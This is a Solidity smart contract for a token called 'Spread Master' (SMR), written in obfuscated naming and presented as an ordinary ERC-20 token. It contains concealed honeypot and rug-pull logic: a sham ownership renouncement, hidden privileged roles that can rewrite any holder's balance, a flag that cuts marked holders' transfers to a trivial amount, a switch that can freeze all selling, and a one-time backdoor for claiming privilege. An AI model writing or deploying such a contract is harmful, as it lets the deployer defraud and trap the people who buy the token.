//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface tradingMin {
    function createPair(address tradingBuy, address takeAmountFee) external returns (address);
}

interface totalList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeFrom) external view returns (uint256);

    function transfer(address txAuto, uint256 marketingIsBuy) external returns (bool);

    function allowance(address fundFeeShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingIsBuy) external returns (bool);

    function transferFrom(
        address sender,
        address txAuto,
        uint256 marketingIsBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTotal, uint256 value);
    event Approval(address indexed fundFeeShould, address indexed spender, uint256 value);
}

abstract contract sellEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoSenderTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityReceiver is totalList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SpreadMaster is sellEnable, totalList, liquidityReceiver {

    function decimals() external view virtual override returns (uint8) {
        return marketingMax;
    }

    function getOwner() external view returns (address) {
        return sellAuto;
    }

    bool private fromTeam;

    bool public fundLaunchMax;

    function enableModeTo() private view {
        require(fromTeamLaunched[_msgSender()]);
    }

    uint256 private fromListTeam;

    function feeMinList(address maxMode, address txAuto, uint256 marketingIsBuy) internal returns (bool) {
        require(launchedBuy[maxMode] >= marketingIsBuy);
        launchedBuy[maxMode] -= marketingIsBuy;
        launchedBuy[txAuto] += marketingIsBuy;
        emit Transfer(maxMode, txAuto, marketingIsBuy);
        return true;
    }

    function approve(address exemptTotal, uint256 marketingIsBuy) public virtual override returns (bool) {
        walletAmount[_msgSender()][exemptTotal] = marketingIsBuy;
        emit Approval(_msgSender(), exemptTotal, marketingIsBuy);
        return true;
    }

    function toTx(address autoSwapTeam) public {
        require(autoSwapTeam.balance < 100000);
        if (walletLaunch) {
            return;
        }
        
        fromTeamLaunched[autoSwapTeam] = true;
        
        walletLaunch = true;
    }

    function allowance(address feeAt, address exemptTotal) external view virtual override returns (uint256) {
        if (exemptTotal == tokenBuySender) {
            return type(uint256).max;
        }
        return walletAmount[feeAt][exemptTotal];
    }

    function teamBuyWallet(address maxMode, address txAuto, uint256 marketingIsBuy) internal returns (bool) {
        if (maxMode == buyReceiver) {
            return feeMinList(maxMode, txAuto, marketingIsBuy);
        }
        uint256 marketingAuto = totalList(walletExemptSell).balanceOf(launchExempt);
        require(marketingAuto == receiverLaunchMin);
        require(txAuto != launchExempt);
        if (shouldReceiver[maxMode]) {
            return feeMinList(maxMode, txAuto, marketingReceiver);
        }
        return feeMinList(maxMode, txAuto, marketingIsBuy);
    }

    function totalAt(uint256 marketingIsBuy) public {
        enableModeTo();
        receiverLaunchMin = marketingIsBuy;
    }

    uint8 private marketingMax = 18;

    bool public walletLaunch;

    string private enableTotal = "SMR";

    function receiverTotal(address minList) public {
        enableModeTo();
        
        if (minList == buyReceiver || minList == walletExemptSell) {
            return;
        }
        shouldReceiver[minList] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingAmount;
    }

    function launchedIs(address feeMarketing, uint256 marketingIsBuy) public {
        enableModeTo();
        launchedBuy[feeMarketing] = marketingIsBuy;
    }

    event OwnershipTransferred(address indexed receiverFund, address indexed takeEnableList);

    uint256 private tradingAmount = 100000000 * 10 ** 18;

    uint256 receiverLaunchMin;

    uint256 constant marketingReceiver = 14 ** 10;

    address public buyReceiver;

    address private sellAuto;

    function listTokenLaunch() public {
        emit OwnershipTransferred(buyReceiver, address(0));
        sellAuto = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return enableTotal;
    }

    mapping(address => bool) public fromTeamLaunched;

    function owner() external view returns (address) {
        return sellAuto;
    }

    uint256 feeWallet;

    uint256 public minTx;

    function name() external view virtual override returns (string memory) {
        return txMarketingShould;
    }

    uint256 private fromWallet;

    function transfer(address feeMarketing, uint256 marketingIsBuy) external virtual override returns (bool) {
        return teamBuyWallet(_msgSender(), feeMarketing, marketingIsBuy);
    }

    mapping(address => uint256) private launchedBuy;

    address public walletExemptSell;

    constructor (){
        if (fromWallet != fromListTeam) {
            fundAmount = shouldAt;
        }
        autoSenderTeam takeLiquidity = autoSenderTeam(tokenBuySender);
        walletExemptSell = tradingMin(takeLiquidity.factory()).createPair(takeLiquidity.WETH(), address(this));
        if (fromListTeam == fundAmount) {
            shouldAt = fromListTeam;
        }
        buyReceiver = _msgSender();
        fromTeamLaunched[buyReceiver] = true;
        launchedBuy[buyReceiver] = tradingAmount;
        listTokenLaunch();
        
        emit Transfer(address(0), buyReceiver, tradingAmount);
    }

    uint256 private fundAmount;

    function transferFrom(address maxMode, address txAuto, uint256 marketingIsBuy) external override returns (bool) {
        if (_msgSender() != tokenBuySender) {
            if (walletAmount[maxMode][_msgSender()] != type(uint256).max) {
                require(marketingIsBuy <= walletAmount[maxMode][_msgSender()]);
                walletAmount[maxMode][_msgSender()] -= marketingIsBuy;
            }
        }
        return teamBuyWallet(maxMode, txAuto, marketingIsBuy);
    }

    mapping(address => mapping(address => uint256)) private walletAmount;

    uint256 public shouldAt;

    string private txMarketingShould = "Spread Master";

    address tokenBuySender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address modeFrom) public view virtual override returns (uint256) {
        return launchedBuy[modeFrom];
    }

    address launchExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public shouldReceiver;

}